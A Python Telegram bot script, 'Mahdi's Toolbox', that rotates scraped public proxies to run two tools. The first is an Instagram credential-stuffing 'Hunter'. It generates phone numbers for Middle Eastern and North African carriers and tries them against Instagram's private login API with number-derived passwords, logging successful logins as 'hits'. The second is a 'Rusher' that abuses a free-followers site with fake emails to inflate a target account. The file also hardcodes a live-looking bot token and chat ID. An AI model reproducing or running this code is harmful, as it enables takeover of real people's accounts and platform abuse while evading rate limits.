# ==============================================================================
#  MAHDI'S TOOLBOX BOT - v2 (Rusher Fixed)
# ==============================================================================
import os
import requests
import random
import time
import threading
import re
import json
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from bs4 import BeautifulSoup

# --- إعدادات أساسية ---
TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
CHAT_ID = "1148797883"

# --- متغيرات الحالة العامة ---
current_task = "idle"
is_running = False
hits = 0
fails = 0
last_event = "Toolbox is idle."
start_time = None
current_target = "None"
proxy_inventory = []
filter_stats = {"checked": 0, "total": 0}
all_proxies_master_list = []
proxy_sources = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
]
network_map = {
    '1': ("Asia (Iraq)", "964", "077"), '2': ("Zain (Iraq)", "964", "078"),
    '3': ("Libya (091)", "218", "91"), '4': ("Libya (092)", "218", "92"),
    '5': ("MCI (Iran)", "98", "91"), '6': ("Irancell (Iran)", "98", "93"),
    '7': ("Vodafone (Egypt)", "20", "10"), '8': ("Orange (Egypt)", "20", "12"),
    '9': ("Ooredoo (Kuwait)", "965", "6"), '10': ("Vodafone (Qatar)", "974", "77")
}
current_hunter_config = {}
hunter_progress = {}

# --- إعدادات Flask لخادم الويب ---
app = Flask(__name__)
@app.route('/')
def home():
    return "Toolbox bot is alive!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# --- دوال البروكسي (مشتركة) ---
def fetch_proxies():
    global all_proxies_master_list, last_event
    all_proxies_master_list.clear()
    temp_proxies = set()
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                temp_proxies.update(response.text.strip().split('\n'))
        except Exception:
            continue
    all_proxies_master_list = list(temp_proxies)
    last_event = f"Fetched {len(all_proxies_master_list)} unique proxies."
    return len(all_proxies_master_list) > 0

def check_proxy(proxy):
    try:
        requests.get("https://www.google.com", proxies={"http": proxy, "https": proxy}, timeout=7)
        return True
    except Exception:
        return False

def filter_worker():
    global filter_stats
    while is_running and all_proxies_master_list:
        proxy = all_proxies_master_list.pop(0)
        filter_stats["checked"] += 1
        if check_proxy(proxy):
            proxy_inventory.append(proxy)

# --- دوال أداة فحص الحسابات (Hunter) ---
def load_hunter_progress():
    global hunter_progress
    try:
        with open("hunter_progress.json", "r") as f:
            hunter_progress = json.load(f)
    except FileNotFoundError:
        hunter_progress = {k: 0 for k in network_map.keys()}

def save_hunter_progress():
    with open("hunter_progress.json", "w") as f:
        json.dump(hunter_progress, f)

def hunter_worker():
    global hits, fails, last_event
    country_code = current_hunter_config["country"]
    prefix = current_hunter_config["prefix"]
    network_key = current_hunter_config["key"]
    
    while is_running:
        if not proxy_inventory:
            time.sleep(2)
            continue
        
        proxy = proxy_inventory.pop(0)
        session = requests.Session()
        session.proxies = {"http": proxy, "https": proxy}
        
        current_num = hunter_progress.get(network_key, 0)
        hunter_progress[network_key] = current_num + 1
        save_hunter_progress()
        
        phone_suffix = str(current_num).zfill(7)
        username = f"{country_code}{prefix}{phone_suffix}"
        password = f"{prefix}{phone_suffix}"
        
        try:
            headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)'}
            data = {'username': username, 'password': password, 'queryParams': '{}', 'optIntoOneTap': 'false'}
            response = session.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, timeout=10)
            
            if 'logged_in_user' in response.text:
                hits += 1
                last_event = f"🎯 HIT! @{username}"
                # Send Telegram message for hit
            else:
                fails += 1
                last_event = f"Checked @{username}"
        except Exception:
            fails += 1
        
        time.sleep(1)

# --- دوال أداة رشق المتابعين (Rusher) - تم إصلاحها ---
def rusher_worker(target_username):
    global hits, fails, last_event
    while is_running:
        if not proxy_inventory:
            time.sleep(2)
            continue
            
        proxy = proxy_inventory.pop(0)
        session = requests.Session()
        session.proxies = {"http": proxy, "https": proxy}
        
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            response_page = session.get("https://superviral.io/free-instagram-followers/", headers=headers, timeout=15)
            
            if response_page.status_code != 200:
                fails += 1; continue

            soup = BeautifulSoup(response_page.text, 'html.parser')
            # ----- السطر الذي تم تعديله -----
            nonce_input = soup.find('input', {'name': '_wpnonce'})
            
            if not nonce_input or not nonce_input.get('value'):
                fails += 1; continue
            
            security_nonce = nonce_input['value']
            random_email = f"user{random.randint(10000, 99999)}@example.com"
            payload = {'action': 'get_free_followers', 'username': target_username, 'email': random_email, '_wpnonce': security_nonce}
            api_url = "https://superviral.io/wp-admin/admin-ajax.php"
            
            # يجب إضافة Referer لزيادة فرص النجاح
            headers['Referer'] = 'https://superviral.io/free-instagram-followers/'
            
            response_api = session.post(api_url, data=payload, headers=headers, timeout=15)
            
            if response_api.status_code == 200 and '"success":true' in response_api.text:
                hits += 1
                last_event = f"✅ Success! +10 for @{target_username}"
            else:
                fails += 1
                last_event = f"Failed for @{target_username}"
        except Exception:
            fails += 1
        
        time.sleep(5)

# --- المدير العام للمهام ---
def main_task_manager(task_type, target):
    global is_running, start_time, current_target, hits, fails, last_event, filter_stats, current_task, current_hunter_config
    
    is_running = True
    current_task = task_type
    start_time = time.time()
    current_target = target
    hits, fails = 0, 0
    filter_stats = {"checked": 0, "total": 0}
    proxy_inventory.clear()

    if not fetch_proxies():
        last_event = "Could not fetch any proxies. Stopping."
        is_running = False
        return
    
    filter_stats["total"] = len(all_proxies_master_list)
    
    filter_threads = [threading.Thread(target=filter_worker) for _ in range(50)]
    for t in filter_threads: t.start()

    while len(proxy_inventory) < 10 and any(t.is_alive() for t in filter_threads):
        time.sleep(5)

    if not proxy_inventory:
        last_event = "No working proxies found. Stopping."
        is_running = False
        return

    if task_type == "hunting":
        load_hunter_progress()
        network_info = network_map[target]
        current_hunter_config = {"key": target, "name": network_info[0], "country": network_info[1], "prefix": network_info[2]}
        current_target = network_info[0]
        worker_threads = [threading.Thread(target=hunter_worker) for _ in range(25)]
    elif task_type == "rushing":
        worker_threads = [threading.Thread(target=rusher_worker, args=(target,)) for _ in range(20)]
    
    for t in worker_threads: t.start()
    
    # ننتظر فقط انتهاء خيوط الفلترة، وليس خيوط العمل
    for t in filter_threads: t.join()
    
    # لا نستخدم join لخيوط العمل حتى لا يتوقف البوت

# --- دوال بوت التيليجرام (الواجهة الرئيسية) ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🕵️‍♂️ فحص الحسابات", callback_data='select_hunting')],
        [InlineKeyboardButton("🚀 رشق المتابعين", callback_data='select_rushing')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('🤖 Welcome to Mahdi\'s Toolbox! Choose a task:', reply_markup=reply_markup)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, current_task
    if not is_running:
        await update.message.reply_text("No task is currently running.")
        return
    is_running = False
    current_task = "idle"
    await update.message.reply_text("🛑 Stopping current task... Please wait for workers to finish their current cycle.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = "N/A"
    if start_time:
        uptime_seconds = int(time.time() - start_time)
        minutes, seconds = divmod(uptime_seconds, 60)
        uptime = f"{minutes:02}:{seconds:02}"

    speed = 0
    if start_time and (hits + fails) > 0:
        elapsed = time.time() - start_time
        speed = (hits + fails) / elapsed * 60 if elapsed > 0 else 0

    task_name = "Idle"
    if current_task == "hunting": task_name = "Hunting"
    elif current_task == "rushing": task_name = "Rushing"

    status_msg = (
        f"📊 *Toolbox Status* 📊\n"
        f"--------------------------------\n"
        f"⚙️ *Task:* {task_name}\n"
        f"🎯 *Target:* {current_target}\n"
        f"⏳ *Uptime:* {uptime}\n"
        f"--------------------------------\n"
        f"🔎 *Filtering:* {filter_stats['checked']}/{filter_stats['total']}\n"
        f"🔋 *Inventory:* {len(proxy_inventory)} proxies ready\n"
        f"--------------------------------\n"
        f"✅ *Hits:* {hits}\n"
        f"❌ *Fails:* {fails}\n"
        f"⚡️ *Speed:* {speed:.1f} attempts/min\n"
        f"--------------------------------\n"
        f"💬 *Last Event:* {last_event}"
    )
    await update.message.reply_text(status_msg, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if is_running:
        await query.edit_message_text(text="⚠️ A task is already running. Use /stop to stop it first.")
        return

    if query.data == 'select_hunting':
        keyboard = [[InlineKeyboardButton(v[0], callback_data=f'hunt_{k}')] for k, v in network_map.items()]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text="🕵️‍♂️ Select a network to hunt:", reply_markup=reply_markup)
    
    elif query.data == 'select_rushing':
        context.user_data['next_step'] = 'awaiting_rush_target'
        await query.edit_message_text(text="🚀 Please send the Instagram username to rush (e.g., @username).")

    elif query.data.startswith('hunt_'):
        network_key = query.data.split('_')[1]
        network_name = network_map[network_key][0]
        await query.edit_message_text(text=f"🕵️‍♂️ Starting hunt for {network_name}...")
        thread = threading.Thread(target=main_task_manager, args=("hunting", network_key))
        thread.start()

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('next_step') == 'awaiting_rush_target':
        username = update.message.text
        if username.startswith('@'):
            username = username[1:]
        
        await update.message.reply_text(f"🚀 Starting rush for @{username}...")
        thread = threading.Thread(target=main_task_manager, args=("rushing", username))
        thread.start()
        context.user_data['next_step'] = None

# --- دالة التشغيل الرئيسية للبوت ---
def run_bot():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    print("Toolbox Bot is up and running...")
    application.run_polling()

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask); flask_thread.daemon = True; flask_thread.start()
    run_bot()
